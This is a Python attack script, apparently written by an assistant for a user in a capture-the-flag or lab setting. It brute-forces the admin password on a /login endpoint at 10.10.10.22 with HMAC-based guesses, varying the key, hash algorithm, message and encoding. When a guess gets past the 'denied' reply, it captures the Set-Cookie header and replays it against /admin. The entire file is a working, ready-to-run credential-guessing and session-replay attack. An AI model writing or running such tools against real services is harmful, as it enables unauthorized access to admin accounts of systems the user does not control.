#!/usr/bin/env python3
# Focused /login cracker for Coastal radar. Model: p = ENC(HMAC(key, msg)).
# Varies key padding, algorithm, message, and ENCODING (hex/upper/base64) — the likely miss.
# On any non-"denied" response it prints the FULL headers (to catch Set-Cookie) and then
# replays /admin with that cookie. YOU run this; login attempts are not capped.
import hmac, hashlib, base64, urllib.request, urllib.parse, re

LOGIN = "http://10.10.10.22:8448/login"
ADMIN = "http://10.10.10.22:8448/admin"

# "radar" padded with station 18 — several readings of "pad":
keys = ["radar18", "radar", "18radar", "radar-18", "radar_18", "radar018",
        "radar" + chr(18), "radar\x12", "radar 18"]
algos = {"sha256": hashlib.sha256, "sha1": hashlib.sha1, "md5": hashlib.md5}
users = ["admin"]                      # /admin says "admin only"
msgs_for = lambda u: [u, u+"18", "18"+u, "u="+u, u+":18", "admin"]

def enc(digest_bytes, hexdig):
    return {
        "hex": hexdig,
        "HEX": hexdig.upper(),
        "b64": base64.b64encode(digest_bytes).decode(),
        "b64url": base64.urlsafe_b64encode(digest_bytes).decode().rstrip("="),
    }

def post(u, p):
    data = urllib.parse.urlencode({"u": u, "p": p}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(LOGIN, data=data), timeout=5)
        return r.getcode(), dict(r.getheaders()), r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode(errors="replace")

def tail(b):
    m = re.search(r'RADAR CALIBRATION</p>(.*?)</div>', b, re.S)
    return (m.group(1) if m else b[:160]).strip()

def admin_with(cookie):
    try:
        r = urllib.request.urlopen(urllib.request.Request(ADMIN, headers={"Cookie": cookie}), timeout=5)
        return r.getcode(), r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")

hit = False
for u in users:
    for msg in msgs_for(u):
        for k in keys:
            for an, h in algos.items():
                mac = hmac.new(k.encode("latin1"), msg.encode(), h)
                for ename, p in enc(mac.digest(), mac.hexdigest()).items():
                    code, hdrs, body = post(u, p)
                    t = tail(body)
                    if t != "denied":
                        hit = True
                        print(f"\n*** HIT  u={u!r} key={k!r} {an} msg={msg!r} enc={ename}")
                        print(f"    p={p}")
                        print(f"    [{code}] body-tail={t[:150]!r}")
                        sc = hdrs.get("Set-Cookie")
                        if sc:
                            print(f"    Set-Cookie: {sc}")
                            ac, ab = admin_with(sc.split(";")[0])
                            print(f"    /admin with cookie -> [{ac}] {tail(ab)[:200]!r}")
print("\ndone." + ("" if hit else " all denied — p is not ENC(HMAC(key,msg)); paste this and we rethink."))
